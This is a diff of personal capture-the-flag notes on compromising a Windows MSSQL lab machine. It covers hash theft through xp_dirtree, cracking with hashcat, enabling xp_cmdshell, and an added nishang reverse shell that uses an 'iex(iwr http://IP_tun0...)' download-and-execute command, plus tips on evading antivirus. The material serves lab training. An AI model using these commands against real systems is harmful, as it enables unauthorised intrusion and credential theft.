@@ -16,6 +16,7 @@ PORT        STATE   SERVICE         VERSION
 47001/tcp   open    http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 
+
 ```bash
 $ smbclient -N -L \\\\IP
 
@@ -89,6 +90,11 @@ $ impacket-mssqlclient Reporting:'passws'@10.129.116.33 -windows-auth
 # [-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
 
 # you should find a user with SA privilege
+SQL> select IS_SRVROLEMEMBER ('sysadmin')
+# ------   
+#  0 
+
+# there isn't any !! 
 
 # we can steal hashes of the SQL service account by using xp_dirtree or xp_fileexist.
 
@@ -115,6 +121,10 @@ $ echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:010
 $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # test1234
 
 $ impacket-mssqlclient mssql-svc:'test1234'@10.129.116.33 -windows-auth
+SQL> select IS_SRVROLEMEMBER ('sysadmin')
+# ------   
+#  1 
+
 SQL> enable_xp_cmdshell # success !! 
 SQL> xp_cmdshell "type ..\..\Users\mssql-svc\Desktop\user.txt"
 
@@ -153,45 +163,96 @@ SQL> enable_xp_cmdshell
 SQL> xp_cmdshell dir ..\..\Users\mssql-svc\Desktop\user.txt
 ```
 
+### nishang reverse shell 
+
+> https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+```tip
+since Invoke-PowerShellTcp.ps1 is a module, running the reverse shell in one line could not work, so it's better to add the function you wanna call at the end of the module so you can run it directly !!
+
+.EXAMPLE - add this line at the end
+Invoke-PowerShellTcp -Reverse -IPAddress IP_tun0 -Port 4444
+```
+
+on 3 terminals
+
+```bash
+$ python3 -m http.server 4444
+```
+
+```bash
+$ nc -lnvp 1234
+```
+
+```bash
+SQL> xp_cmdshell "powershell -c iex(iwr http://IP_tun0:4444/shell.ps1)"
+```
+
+```note
+some times due to windows firewall, you need to make your netcat listen on port 80 or 443 
+```
+
+### hoaxshell reverse shell
+
+### reverse shell generator reverse shell
+
+
+```tip
+pick the method that bypass the AV  
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
 # ntlm relay
 
-
-User QUERIER\mssql-svc authenticated successfully
-[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000
-[*] Connecting Share(1:IPC$)
-[*] Connecting Share(2:share-kali)
-[*] AUTHENTICATE_MESSAGE (\,QUERIER)
-[*] User QUERIER\ authenticated successfully
-[*] :::00::aaaaaaaaaaaaaaaa
-
-
-```bash
-echo "mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:59e20e11c6e191c8ec687d9227d6f074:0101000000000000002f2676c5d4d90181d517003f90cf7e000000000100100041007a004800770071007700410079000300100041007a00480077007100770041007900020010007700580070004b0057004e004b004900040010007700580070004b0057004e004b00490007000800002f2676c5d4d90106000400020000000800300030000000000000000000000000300000788328683007061b88c05e4481a96893d7adb2d4d910c47adf66d466f8b6f5530a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003600000000000000000000000000" > hash
-
-$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt # test1234
-```
-
 corporate568
 
 ## what is mssql-svc
 
-```bash
-
-```
 
 type of windows accounts: 
 * user aacount 
 * machine account
 * service account ======> mostly it has the SeImpersonatePrivilege enabled !! 
 
-
-
-usnig nc64.exe bypasses the AV !! 
-
-sometimes we can't run a powershell commands on the system !! 
 
 # SE impersonate
 
@@ -231,12 +292,21 @@ JuicyPotato : : used mostly when you have a user account
 <br>
 
 
+Nishang/Shells/Invoke-PowerShellTcp.ps1
 
+on kali 
+```bash
+$ pwsh
+```
+```powershell
+PS> import-module Invoke-PowerShellTcp.ps1
+PS> get-module
+# Invoke-PowerShellTcp.ps1
 
+PS> 
 
-
-
-
+PS> 
+```
 
 
 
